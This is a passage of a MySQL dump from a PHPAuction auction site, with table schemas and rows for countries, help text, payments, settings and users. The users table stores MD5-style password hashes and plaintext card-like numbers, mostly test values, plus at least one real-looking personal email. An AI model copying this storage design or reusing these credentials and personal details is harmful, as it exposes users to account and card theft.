Islands'),(73,'Fiji'),(74,'Finland'),(75,'France'),(76,'French Guiana'),(77,'French Polynesia'),(78,'French Southern Territories'),(79,'Gabon'),(80,'Gambia'),(81,'Georgia'),(82,'Ghana'),(83,'Gibraltar'),(84,'Great Britain'),(85,'Greece'),(86,'Greenland'),(87,'Grenada'),(88,'Guadeloupe'),(89,'Guam'),(90,'Guatemala'),(91,'Guinea'),(92,'Guinea-Bissau'),(93,'Guyana'),(94,'Haiti'),(95,'Heard and Mc Donald Islands'),(96,'Holy See (Vatican City State)'),(97,'Honduras'),(98,'Hong Kong'),(99,'Hungary'),(100,'Iceland'),(101,'India'),(102,'Indonesia'),(103,'Ireland'),(104,'Israel'),(105,'Italy'),(106,'Jamaica'),(107,'Japan'),(108,'Jordan'),(109,'Kazakhstan'),(110,'Kenya'),(111,'Kiribati'),(112,'Korea (South)'),(113,'Kuwait'),(114,'Kyrgyzstan'),(115,'Lao People\'s Democratic Republ'),(116,'Latvia'),(117,'Lebanon'),(118,'Lesotho'),(119,'Liberia'),(120,'Liechtenstein'),(121,'Lithuania'),(122,'Luxembourg'),(123,'Macau'),(124,'Macedonia'),(125,'Madagascar'),(126,'Malawi'),(127,'Malaysia'),(128,'Maldives'),(129,'Mali'),(130,'Malta'),(131,'Marshall Islands'),(132,'Martinique'),(133,'Mauritania'),(134,'Mauritius'),(135,'Mayotte'),(136,'Mexico'),(137,'Micronesia, Federated States o'),(138,'Moldova, Republic of'),(139,'Monaco'),(140,'Mongolia'),(141,'Montserrat'),(142,'Morocco'),(143,'Mozambique'),(144,'Namibia'),(145,'Nauru'),(146,'Nepal'),(147,'Netherlands'),(148,'Netherlands Antilles'),(149,'New Caledonia'),(150,'New Zealand'),(151,'Nicaragua'),(152,'Niger'),(153,'Nigeria'),(154,'Niuev'),(155,'Norfolk Island'),(156,'Northern Ireland'),(157,'Northern Mariana Islands'),(158,'Norway'),(159,'Oman'),(160,'Pakistan'),(161,'Palau'),(162,'Panama'),(163,'Papua New Guinea'),(164,'Paraguay'),(165,'Peru'),(166,'Philippines'),(167,'Pitcairn'),(168,'Poland'),(169,'Portugal'),(170,'Puerto Rico'),(171,'Qatar'),(172,'Reunion'),(173,'Romania'),(174,'Russian Federation'),(175,'Rwanda'),(176,'Saint Kitts and Nevis'),(177,'Saint Lucia'),(178,'Saint Vincent and the Grenadin'),(179,'Samoa (Independent)'),(180,'San Marino'),(181,'Sao Tome and Principe'),(182,'Saudi Arabia'),(183,'Scotland'),(184,'Senegal'),(185,'Seychelles'),(186,'Sierra Leone'),(187,'Singapore'),(188,'Slovakia'),(189,'Slovenia'),(190,'Solomon Islands'),(191,'Somalia'),(192,'South Africa'),(193,'South Georgia and the South Sa'),(194,'Spain'),(195,'Sri Lanka'),(196,'St. Helena'),(197,'St. Pierre and Miquelon'),(198,'Suriname'),(199,'Svalbard and Jan Mayen Islands'),(200,'Swaziland'),(201,'Sweden'),(202,'Switzerland'),(203,'Taiwan'),(204,'Tajikistan'),(205,'Tanzania'),(206,'Thailand'),(207,'Togo'),(208,'Tokelau'),(209,'Tonga'),(210,'Trinidad and Tobago'),(211,'Tunisia'),(212,'Turkey'),(213,'Turkmenistan'),(214,'Turks and Caicos Islands'),(215,'Tuvalu'),(216,'Uganda'),(217,'Ukraine'),(218,'United Arab Emiratesv'),(219,'United States'),(220,'Uruguay'),(221,'Uzbekistan'),(222,'Vanuatu'),(223,'Venezuela'),(224,'Viet Nam'),(225,'Virgin Islands (British)'),(226,'Virgin Islands (U.S.)'),(227,'Wales'),(228,'Wallis and Futuna Islands'),(229,'Western Sahara'),(230,'Yemen'),(231,'Zambia'),(232,'Zimbabwe'),(236,'Germany');
/*!40000 ALTER TABLE `countries` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `durations`
--

DROP TABLE IF EXISTS `durations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `durations` (
  `days` int(2) NOT NULL DEFAULT '0',
  `description` varchar(30) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `durations`
--

LOCK TABLES `durations` WRITE;
/*!40000 ALTER TABLE `durations` DISABLE KEYS */;
INSERT INTO `durations` VALUES (1,'1 day'),(3,'3 days'),(7,'1 week'),(30,'1 month'),(60,'2 months'),(90,'3 months'),(15,'2 weeks');
/*!40000 ALTER TABLE `durations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `feedbacks`
--

DROP TABLE IF EXISTS `feedbacks`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `feedbacks` (
  `rated_user_id` varchar(32) DEFAULT NULL,
  `rater_user_nick` varchar(20) DEFAULT NULL,
  `feedback` mediumtext,
  `rate` int(2) DEFAULT NULL,
  `feedbackdate` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `feedbacks`
--

LOCK TABLES `feedbacks` WRITE;
/*!40000 ALTER TABLE `feedbacks` DISABLE KEYS */;
INSERT INTO `feedbacks` VALUES ('','superman','Lovely orders u have !!\r<BR>\r<BR>how many times did u get this right ?\r<BR>\r<BR>(u really superman ?)',4,'2007-02-08 16:34:59'),('','pookipoo','lovely !!#',4,'2007-02-08 16:35:43');
/*!40000 ALTER TABLE `feedbacks` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `help`
--

DROP TABLE IF EXISTS `help`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `help` (
  `topic` varchar(40) DEFAULT NULL,
  `helptext` text
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `help`
--

LOCK TABLES `help` WRITE;
/*!40000 ALTER TABLE `help` DISABLE KEYS */;
INSERT INTO `help` VALUES ('General','Welcome to the PHPAuction, a web site that lets you buy and sell items in auction format.\r\n<br><br>\r\nRegistered users may place items up for auction and may bid on other user\'s items.  To register, you must provide your name, an address, and your email address.  You must be 18 years or older.\r\n<br><br>\r\nWhen selling an item, you may enter a description of the item, upload a photograph, and indicate the minimum bid and a reserve price for the item.  You also indicate what payments you will accept and whether you or the buyer will pay shipping.\r\n<br><br>\r\nSellers are notified by email when an auction is concluded.  If a winner exists, the winner and seller are provided each other\'s contact information.\r\n<br>\r\n\r\n</ul>\r\n\r\n\r\n\r\n'),('Registering','To register as a new user, click on Register at the top of the window.  You will be asked for your name, a username and password, and contact information, including your email address.\r\n<br><br>\r\n<center><font color=red>You must be at least 18 years of age to register.</font></center>\r\n<br><br>\r\n'),('Bidding','To bid on an item, type your bid amount in the box next to the item description, and click the \"Go\" button.  Your bid must be above the Minimum Bid amount specified in the box.\r\n<br><br>\r\nYou will be asked to confirm your bid.  Fill in your username and password and click \"Submit\" to complete your bid.\r\n<br><br>\r\n'),('Selling','To sell an item, you must be a <a href=\"help.php?topic=Registering\">registered user</a>.\r\n<br><br>\r\nClick on \"Sell an Item\" at the top of the window to create a new auction.  Indicate the title and description of your item, and select a graphic image from your local hard drive if you wish to upload a picture of the item.\r\n<br><br>\r\nSpecify the minimum bid and reserve price (optional) for your auction, and what types of payment you will accept.  While this site allows you to specify payment methods, it does not process the payment for you.\r\n<br><br>\r\nChoose the category in which your item should be.  You may suggest a new category, but you must select an existing category for your new auction.\r\n<br><br>\r\n');
/*!40000 ALTER TABLE `help` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `increments`
--

DROP TABLE IF EXISTS `increments`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `increments` (
  `id` char(3) DEFAULT NULL,
  `low` double(16,4) DEFAULT NULL,
  `high` double(16,4) DEFAULT NULL,
  `increment` double(16,4) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `increments`
--

LOCK TABLES `increments` WRITE;
/*!40000 ALTER TABLE `increments` DISABLE KEYS */;
INSERT INTO `increments` VALUES ('1',0.0000,0.9900,0.2500),('2',1.0000,9.9900,0.5000),('3',10.0000,29.9900,1.0000),('4',30.0000,99.9900,2.0000),('5',100.0000,249.9900,5.0000),('6',250.0000,499.9900,10.0000),('7',500.0000,999.9900,25.0000);
/*!40000 ALTER TABLE `increments` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `news`
--

DROP TABLE IF EXISTS `news`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `news` (
  `id` varchar(32) NOT NULL DEFAULT '',
  `title` varchar(200) NOT NULL DEFAULT '',
  `content` longtext NOT NULL,
  `new_date` int(8) NOT NULL DEFAULT '0',
  `suspended` int(1) NOT NULL DEFAULT '0'
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `news`
--

LOCK TABLES `news` WRITE;
/*!40000 ALTER TABLE `news` DISABLE KEYS */;
INSERT INTO `news` VALUES ('5299b6d9ef0a4e610cce3a5c9453dfdb','Test','Testing...',20033105,0);
/*!40000 ALTER TABLE `news` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `payments`
--

DROP TABLE IF EXISTS `payments`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `payments` (
  `id` int(2) DEFAULT NULL,
  `description` varchar(30) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `payments`
--

LOCK TABLES `payments` WRITE;
/*!40000 ALTER TABLE `payments` DISABLE KEYS */;
INSERT INTO `payments` VALUES (1,'Checks'),(2,'Money Order'),(3,'Paypal'),(4,'MasterCard or Visa'),(5,'Wire Transfer');
/*!40000 ALTER TABLE `payments` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `phpads_acls`
--

DROP TABLE IF EXISTS `phpads_acls`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `phpads_acls` (
  `bannerID` mediumint(9) NOT NULL DEFAULT '0',
  `acl_con` set('and','or') NOT NULL DEFAULT '',
  `acl_type` enum('clientip','useragent','weekday','domain','source','time','language') NOT NULL DEFAULT 'clientip',
  `acl_data` varchar(255) NOT NULL DEFAULT '',
  `acl_ad` set('allow','deny') NOT NULL DEFAULT '',
  `acl_order` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`bannerID`,`acl_order`),
  KEY `bannerID` (`bannerID`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `phpads_acls`
--

LOCK TABLES `phpads_acls` WRITE;
/*!40000 ALTER TABLE `phpads_acls` DISABLE KEYS */;
/*!40000 ALTER TABLE `phpads_acls` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `phpads_adclicks`
--

DROP TABLE IF EXISTS `phpads_adclicks`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `phpads_adclicks` (
  `bannerID` mediumint(9) NOT NULL DEFAULT '0',
  `t_stamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `host` varchar(255) NOT NULL DEFAULT '',
  KEY `clientID` (`bannerID`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `phpads_adclicks`
--

LOCK TABLES `phpads_adclicks` WRITE;
/*!40000 ALTER TABLE `phpads_adclicks` DISABLE KEYS */;
/*!40000 ALTER TABLE `phpads_adclicks` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `phpads_adstats`
--

DROP TABLE IF EXISTS `phpads_adstats`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `phpads_adstats` (
  `views` int(11) NOT NULL DEFAULT '0',
  `clicks` int(11) NOT NULL DEFAULT '0',
  `day` date NOT NULL DEFAULT '0000-00-00',
  `BannerID` smallint(6) NOT NULL DEFAULT '0',
  PRIMARY KEY (`day`,`BannerID`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `phpads_adstats`
--

LOCK TABLES `phpads_adstats` WRITE;
/*!40000 ALTER TABLE `phpads_adstats` DISABLE KEYS */;
/*!40000 ALTER TABLE `phpads_adstats` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `phpads_adviews`
--

DROP TABLE IF EXISTS `phpads_adviews`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `phpads_adviews` (
  `bannerID` mediumint(9) NOT NULL DEFAULT '0',
  `t_stamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `host` varchar(255) NOT NULL DEFAULT '',
  KEY `clientID` (`bannerID`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `phpads_adviews`
--

LOCK TABLES `phpads_adviews` WRITE;
/*!40000 ALTER TABLE `phpads_adviews` DISABLE KEYS */;
/*!40000 ALTER TABLE `phpads_adviews` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `phpads_banners`
--

DROP TABLE IF EXISTS `phpads_banners`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `phpads_banners` (
  `bannerID` mediumint(9) NOT NULL AUTO_INCREMENT,
  `clientID` mediumint(9) NOT NULL DEFAULT '0',
  `active` enum('true','false') NOT NULL DEFAULT 'true',
  `weight` tinyint(4) NOT NULL DEFAULT '1',
  `seq` tinyint(4) NOT NULL DEFAULT '0',
  `banner` blob NOT NULL,
  `width` smallint(6) NOT NULL DEFAULT '0',
  `height` smallint(6) NOT NULL DEFAULT '0',
  `format` enum('gif','jpeg','png','html','url','web','swf') NOT NULL DEFAULT 'gif',
  `url` varchar(255) NOT NULL DEFAULT '',
  `alt` varchar(255) NOT NULL DEFAULT '',
  `status` varchar(255) NOT NULL DEFAULT '',
  `keyword` varchar(255) NOT NULL DEFAULT '',
  `bannertext` varchar(255) NOT NULL DEFAULT '',
  `target` varchar(8) NOT NULL DEFAULT '',
  `description` varchar(255) NOT NULL DEFAULT '',
  `autohtml` enum('true','false') NOT NULL DEFAULT 'true',
  PRIMARY KEY (`bannerID`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `phpads_banners`
--

LOCK TABLES `phpads_banners` WRITE;
/*!40000 ALTER TABLE `phpads_banners` DISABLE KEYS */;
/*!40000 ALTER TABLE `phpads_banners` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `phpads_clients`
--

DROP TABLE IF EXISTS `phpads_clients`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `phpads_clients` (
  `clientID` mediumint(9) NOT NULL AUTO_INCREMENT,
  `clientname` varchar(255) NOT NULL DEFAULT '',
  `contact` varchar(255) DEFAULT NULL,
  `email` varchar(64) NOT NULL DEFAULT '',
  `views` mediumint(9) DEFAULT NULL,
  `clicks` mediumint(9) DEFAULT NULL,
  `clientusername` varchar(64) NOT NULL DEFAULT '',
  `clientpassword` varchar(64) NOT NULL DEFAULT '',
  `expire` date DEFAULT '0000-00-00',
  `activate` date DEFAULT '0000-00-00',
  `permissions` mediumint(9) DEFAULT NULL,
  `language` varchar(64) DEFAULT NULL,
  `active` enum('true','false') NOT NULL DEFAULT 'true',
  `weight` tinyint(4) NOT NULL DEFAULT '1',
  `parent` mediumint(9) NOT NULL DEFAULT '0',
  `report` enum('true','false') NOT NULL DEFAULT 'true',
  `reportinterval` mediumint(9) NOT NULL DEFAULT '7',
  `reportlastdate` date NOT NULL DEFAULT '0000-00-00',
  `reportdeactivate` enum('true','false') NOT NULL DEFAULT 'true',
  PRIMARY KEY (`clientID`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `phpads_clients`
--

LOCK TABLES `phpads_clients` WRITE;
/*!40000 ALTER TABLE `phpads_clients` DISABLE KEYS */;
/*!40000 ALTER TABLE `phpads_clients` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `phpads_session`
--

DROP TABLE IF EXISTS `phpads_session`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `phpads_session` (
  `SessionID` varchar(32) NOT NULL DEFAULT '',
  `SessionData` blob NOT NULL,
  `LastUsed` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`SessionID`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `phpads_session`
--

LOCK TABLES `phpads_session` WRITE;
/*!40000 ALTER TABLE `phpads_session` DISABLE KEYS */;
/*!40000 ALTER TABLE `phpads_session` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `phpads_zones`
--

DROP TABLE IF EXISTS `phpads_zones`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `phpads_zones` (
  `zoneid` mediumint(9) NOT NULL AUTO_INCREMENT,
  `zonename` varchar(255) NOT NULL DEFAULT '',
  `description` varchar(255) NOT NULL DEFAULT '',
  `zonetype` smallint(6) NOT NULL DEFAULT '0',
  `what` blob NOT NULL,
  `width` smallint(6) NOT NULL DEFAULT '0',
  `height` smallint(6) NOT NULL DEFAULT '0',
  `retrieval` enum('random','cookie') NOT NULL DEFAULT 'random',
  `cachecontents` blob,
  `cachetimestamp` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`zoneid`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `phpads_zones`
--

LOCK TABLES `phpads_zones` WRITE;
/*!40000 ALTER TABLE `phpads_zones` DISABLE KEYS */;
/*!40000 ALTER TABLE `phpads_zones` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `request`
--

DROP TABLE IF EXISTS `request`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `request` (
  `req_auction` varchar(32) DEFAULT NULL,
  `req_user` varchar(32) DEFAULT NULL,
  `req_text` text,
  `req_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `request`
--

LOCK TABLES `request` WRITE;
/*!40000 ALTER TABLE `request` DISABLE KEYS */;
/*!40000 ALTER TABLE `request` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sessions`
--

DROP TABLE IF EXISTS `sessions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `sessions` (
  `id` varchar(33) DEFAULT '',
  `vars` text,
  `created` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `last_visit` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sessions`
--

LOCK TABLES `sessions` WRITE;
/*!40000 ALTER TABLE `sessions` DISABLE KEYS */;
/*!40000 ALTER TABLE `sessions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `settings`
--

DROP TABLE IF EXISTS `settings`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `settings` (
  `sitename` varchar(255) NOT NULL DEFAULT '',
  `siteurl` varchar(255) NOT NULL DEFAULT '',
  `cookiesprefix` varchar(100) NOT NULL DEFAULT '',
  `loginbox` int(1) NOT NULL DEFAULT '0',
  `newsbox` int(1) NOT NULL DEFAULT '0',
  `newstoshow` int(11) NOT NULL DEFAULT '0',
  `moneyformat` int(1) NOT NULL DEFAULT '0',
  `moneydecimals` int(11) NOT NULL DEFAULT '0',
  `moneysymbol` int(1) NOT NULL DEFAULT '0',
  `currency` varchar(10) NOT NULL DEFAULT '',
  `showacceptancetext` int(1) NOT NULL DEFAULT '0',
  `acceptancetext` longtext NOT NULL,
  `adminmail` varchar(100) NOT NULL DEFAULT '',
  `err_font` varchar(5) NOT NULL DEFAULT '',
  `std_font` varchar(5) NOT NULL DEFAULT '',
  `sml_font` varchar(5) NOT NULL DEFAULT '',
  `tlt_font` varchar(5) NOT NULL DEFAULT '',
  `nav_font` varchar(5) NOT NULL DEFAULT '',
  `footer_font` varchar(5) NOT NULL DEFAULT '',
  `bordercolor` char(1) NOT NULL DEFAULT '0',
  `headercolor` char(1) NOT NULL DEFAULT '0',
  `tableheadercolor` varchar(4) NOT NULL DEFAULT '0000',
  `linkscolor` char(1) NOT NULL DEFAULT '0',
  `vlinkscolor` char(1) NOT NULL DEFAULT '0',
  `banners` int(1) NOT NULL DEFAULT '0',
  `newsletter` int(1) NOT NULL DEFAULT '0',
  `logo` varchar(255) NOT NULL DEFAULT ''
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `settings`
--

LOCK TABLES `settings` WRITE;
/*!40000 ALTER TABLE `settings` DISABLE KEYS */;
INSERT INTO `settings` VALUES ('PHPAUCTION','http://phpauction.org/','PHPAUCTIONPREFIX',1,1,5,1,2,2,'USD',1,'By clicking below you agree to the terms of this website.','webmaster@phpauction.org','33f12','22o22','21o22','24o12','22r22','11r22','p','r','p','p','o',1,1,'logo.gif');
/*!40000 ALTER TABLE `settings` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `users` (
  `id` varchar(32) NOT NULL DEFAULT '',
  `nick` varchar(20) DEFAULT NULL,
  `password` varchar(32) DEFAULT NULL,
  `name` tinytext,
  `address` tinytext,
  `city` varchar(25) DEFAULT NULL,
  `prov` varchar(10) DEFAULT NULL,
  `country` varchar(4) DEFAULT NULL,
  `zip` varchar(6) DEFAULT NULL,
  `phone` varchar(40) DEFAULT NULL,
  `email` varchar(50) DEFAULT NULL,
  `creditcard` varchar(50) DEFAULT NULL,
  `reg_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `rate_sum` int(11) DEFAULT NULL,
  `rate_num` int(11) DEFAULT NULL,
  `birthdate` int(8) DEFAULT NULL,
  `suspended` int(1) DEFAULT '0',
  `nletter` int(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES ('02ad9ab807e197dd292f16730e6934d5','333333','d73e0d7a50fce20e40e3a071e1eaf5e6','Assaf Three','12 r st','NA','aaaaa','190','12345','1234567','testme4@test.com','25803333333333','2004-07-26 20:00:44',0,0,19711111,0,2),('c954d399973fe03368d1991c56730d3a','markshahaf','d73e0d7a50fce20e40e3a071e1eaf5e6','Mark Shahaf','12 r st','NA','aaaaa','190','12345','1234567','testme4@test.com','233232-54544-656565','2004-07-26 20:00:44',0,0,19711111,0,2),('305eaf575160221e0576c89051d3bf54','shahafmark','d73e0d7a50fce20e40e3a071e1eaf5e6','Shahaf Mark','12 r st','NA','aaaaa','190','12345','1234567','testme4@test.com','3333-455454-65656','2004-07-26 20:00:44',0,0,19711111,0,2),('9a20ab8eba7cb9018ac8e4a1479a29de','charliecano','d73e0d7a50fce20e40e3a071e1eaf5e6','Charlie Cano','12 r st','NA','aaaaa','190','12345','1234567','testme4@test.com','1234567890','2004-07-26 20:00:44',0,0,19711111,0,2),('2ab4a8103ade2275b6ded8bf97dcea54','autoone','d73e0d7a50fce20e40e3a071e1eaf5e6','Automated User One','12 r st','NA','aaaaa','190','12345','1234567','testme4@test.com','1234-1234-1234-1234','2004-07-26 20:00:44',0,0,19711111,0,2),('8b07eafda17b8aa859a2169066a3ecf9','pasha_pasha','d73e0d7a50fce20e40e3a071e1eaf5e6','pasha','12 r st','NA','aaaaa','190','12345','1234567','testme4@test.com','1234-4321-1234-4321','2004-07-26 20:00:44',0,0,19711111,0,2),('8a13d37b1c0a63b2001f39139afbdcc6','bill_bill','d73e0d7a50fce20e40e3a071e1eaf5e6','bill','12 r st','NA','aaaaa','190','12345','1234567','testme4@test.com','1234-4321-1234-4321','2004-07-26 20:00:44',0,0,19711111,0,2),('1a95ce3a54cf1e88ffee87786e729566','jim_jim','d73e0d7a50fce20e40e3a071e1eaf5e6','jim','12 r st','NA','aaaaa','190','12345','1234567','testme4@test.com','1234-4321-1234-4321','2004-07-26 20:00:44',0,0,19711111,0,2),('6b625f0eb2193e7f75c0bb1ee60bb83c','Bill_Smith','d73e0d7a50fce20e40e3a071e1eaf5e6','Bill Smith','12 r st','NA','aaaaa','190','12345','1234567','testme4@test.com','1234567','2004-07-26 20:00:44',0,0,19711111,0,2),('399bd5c9bdbf0e072b2dafc9e3704e5b','idobreger','d73e0d7a50fce20e40e3a071e1eaf5e6','Ido Breger','12 r st','NA','aaaaa','190','12345','1234567','testme4@test.com','1111222233334444','2004-07-26 20:00:44',0,0,19711111,0,2),('240d3a2905578439c77720d4a54545ad','marksh','d73e0d7a50fce20e40e3a071e1eaf5e6','Mark Shahaf','12 r st','NA','aaaaa','190','12345','1234567','testme4@test.com','1111222233334444','2004-07-26 20:00:44',0,0,19711111,0,2),('5f610cc65a846933db9ce8944ff927b6','dafa13','99b311a1feb1488584bb095aa730e1a7','dafa13','jkt','jkt','jkt','103','14380','083203920342','banumurti.danardono@gmail.com','12312130812398123','2007-07-26 17:00:00',0,0,19790807,0,2),('22b3a04b19715f6b821d3ebfa24f9007','debian','e7eccdc6877bbe29fe482adeb2e791df','debian','somewhere','out','there','103','12345','08123456789','debian@','6666777788889999','2011-12-21 17:00:00',0,0,19800101,0,2),('08c5f7a10b44a3f729a3c454d763a955','clinton','d73e0d7a50fce20e40e3a071e1eaf5e6','clinton','12 r st','NA','aaaaa','190','12345','1234567','testme4@test.com','8888888','2004-07-26 20:00:44',0,0,19711111,0,2),('478e70842d3cf1985fb7dadbb2e31c16','Shahaf','d73e0d7a50fce20e40e3a071e1eaf5e6','Mark','12 r st','NA','aaaaa','190','12345','1234567','testme4@test.com','123487654773373','2004-07-26 20:00:44',0,0,19711111,0,2),('f908494e59ccb6975e0cde4decc5868f','rootroot','d73e0d7a50fce20e40e3a071e1eaf5e6','root magnifire','12 r st','NA','aaaaa','190','12345','1234567','testme4@test.com','888888222222','2004-07-26 20:00:44',0,0,19711111,0,2),('b76b2601f8b2732ac5ab4239c26c6df4','nir_sh','d73e0d7a50fce20e40e3a071e1eaf5e6','Nir Shahaf','12 r st','NA','aaaaa','190','12345','1234567','testme4@test.com','1111222233334444','2004-07-26 20:00:44',0,0,19711111,0,2),('a87f0b1f2c29df309517044d1fc4b0e0','kagansky','d73e0d7a50fce20e40e3a071e1eaf5e6','kagansky','12 r st','NA','aaaaa','190','12345','1234567','testme4@test.com','9987 9887 9886 4443','2004-07-26 20:00:44',0,0,19711111,0,2),('223e292c63acaf04a28ebf332c270588','marusya','d73e0d7a50fce20e40e3a071e1eaf5e6','anna','12 r st','NA','aaaaa','190','12345','1234567','testme4@test.com','1237 4444 6666 4586','2004-07-26 20:00:44',0,0,19711111,0,2),('649c999caaf27e6bcc3d84a4b73b0089','nirnir','d73e0d7a50fce20e40e3a071e1eaf5e6','nir','12 r st','NA','aaaaa','190','12345','1234567','testme4@test.com','2345 3456 5678 8765','2004-07-26 20:00:44',0,0,19711111,0,2),('0d1b8d7dfcf5dbd8fc689bd5816d7547','plotnikov','d73e0d7a50fce20e40e3a071e1eaf5e6','I','12 r st','NA','aaaaa','190','12345','1234567','testme4@test.com','123123123123123','2004-07-26 20:00:44',0,0,19711111,0,2),('1d9fce06546da0b77576522d55f7f47d','jsmith','d73e0d7a50fce20e40e3a071e1eaf5e6','John Smith','12 r st','NA','aaaaa','190','12345','1234567','testme4@test.com','4444 3232 2234 9975','2004-07-26 20:00:44',0,0,19711111,0,2),('6eafaa376a669bdc2991f9d04ad19a65','pookipoo','cdee0b11e27c3be1dc7d0e2e03d921e6','pookipoo','toyland lane 12','toyland 